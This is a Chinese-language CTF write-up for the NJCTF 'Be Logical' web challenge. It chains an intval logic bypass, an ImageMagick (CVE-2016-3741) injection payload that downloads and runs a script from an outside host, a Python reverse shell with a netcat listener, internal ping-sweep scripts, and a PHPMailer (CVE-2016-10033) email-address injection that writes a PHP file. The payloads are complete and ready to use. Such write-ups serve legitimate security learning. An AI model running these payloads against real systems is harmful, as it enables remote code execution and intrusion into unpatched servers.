---
title: Be Logical-逻辑漏洞->ImageMagick->PHPMailer
date: 2017-03-28 00:00:00
categories:
- CTF/Web
tags: NJCTF 内网扫描 ImageMagick PHPMailer php黑魔法 intval
---

## 解题步骤

### 逻辑漏洞

- 是后台在refund的操作中，用了intval函数，比较point与mony是否相等，来确认数据没有被篡改。但是，我们可以通过科学计数法绕过。intval(1e3)=intval(1)。这样就能购买服务了。

### ImageMagick

> 这里有 convert 图片的功能，猜测是ImageMagick命令执行漏洞

- 命令执行漏洞是出在ImageMagick对https形式的文件处理的过程中

> 上传1.png

```bash
push graphic-context
viewbox 0 0 640 480
fill 'url(https://example.com/image.jpg"|wget http://bendawang.site:8000/a.py -O /tmp/bendawang.py && python /tmp/bendawang.py 103.228.131.75 12310")'
pop graphic-context
```

---

> python 反弹shell

```python
import socket,subprocess,os,sys;
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect((sys.argv[1],int(sys.argv[2])));

# 重定向标准输入，标准输出，标准错误到socket连接中
os.dup2(s.fileno(),0); 
os.dup2(s.fileno(),1); 
os.dup2(s.fileno(),2);

# 子进程打开一个shell
p=subprocess.call(["/bin/sh","-i"]);
```
---
> nc开启监听

```bash
$ nc -l 12310
```

- 并没有在本机发现flag

### 内网扫描

> 快速探测内网

```bash
$ arp -nv

```

---

> python 扫描脚本

```python
#-*- coding: utf-8 -*-  
#author: orangleliu  date: 2014-11-12  
#python2.7.x  ip_scaner.py  
  
''''' 
不同平台，实现对所在内网端的ip扫描 
 
有时候需要知道所在局域网的有效ip，但是又不想找特定的工具来扫描。 
使用方法 python ip_scaner.py 192.168.1.1  
(会扫描192.168.1.1-255的ip) 
'''  
  
import platform  
import sys  
import os  
import time  
import thread  
  
def get_os():  
    ''''' 
    get os 类型 
    '''  
    os = platform.system()  
    if os == "Windows":  
        return "n"  
    else:  
        return "c"  
      
def ping_ip(ip_str):  
    cmd = ["ping", "-{op}".format(op=get_os()),  
           "1", ip_str]  
    output = os.popen(" ".join(cmd)).readlines()  
      
    flag = False  
    for line in list(output):  
        if not line:  
            continue  
        if str(line).upper().find("TTL") >=0:  
            flag = True  
            break  
    if flag:  
        print "ip: %s is ok ***"%ip_str  
  
def find_ip(ip_prefix):  
    ''''' 
    给出当前的127.0.0 ，然后扫描整个段所有地址 
    '''  
    for i in range(1,256):  
        ip = '%s.%s'%(ip_prefix,i)  
        thread.start_new_thread(ping_ip, (ip,))  
        time.sleep(0.3)  
      
if __name__ == "__main__":  
    print "start time %s"%time.ctime()  
    commandargs = sys.argv[1:]  
    args = "".join(commandargs)      
      
    ip_prefix = '.'.join(args.split('.')[:-1])  
    find_ip(ip_prefix)  
    print "end time %s"%time.ctime() 
```

---

> bash扫描脚本

```bash
scan()  {
  #statements
  ping -c 1 $1.$2 > /dev/null && echo "$1.$2 is alive"
}
for  i in `seq 1 254`
do
   scan $1 $i  &
done
```

-  发现存活主机

```bash
Address                  HWtype  HWaddress           Flags Mask            Iface
172.17.42.1              ether   72:1d:76:57:41:32   C                     eth0
172.26.0.20              ether   72:1d:76:57:41:32   C                     eth0
172.17.0.1               ether   02:42:ac:11:00:01   C                     eth0
172.17.0.19              ether   02:42:ac:11:00:13   C                     eth0
Entries: 4  Skipped: 0  Found: 4
```

- curl测试可以看到在172.17.0.19存活一个Mail SYSTEM

### PHPMailer

- 攻击者只需巧妙地构造出一个形如`aaa( -X/home/www/success.php )@qq.com`的恶意邮箱地址，即可写入任意文件，造成远程命令执行的危害，测试如下

```bash
curl http://172.17.0.19 -d "subject=aaaaa&email=aaa( -X /var/www/html/uploads/bendawang.php -OQueueDirectory=/tmp )@qq.com&message=<?php phpinfo();?>&submit=Send email"
```

- 读目录文件得到flag

## 知识小结

- intval()函数逻辑漏洞（题目设定）

- 内网扫描

- ImageMagick 命令执行漏洞
[http://www.tuicool.com/articles/rYvueaN](http://www.tuicool.com/articles/rYvueaN)

- PHPMailer 命令执行漏洞
[https://blog.chaitin.cn/phpmailer-cve-2016-10033/](https://blog.chaitin.cn/phpmailer-cve-2016-10033/)

## CVE漏洞编号

- CVE-2016-3741
- CVE-2016-10033
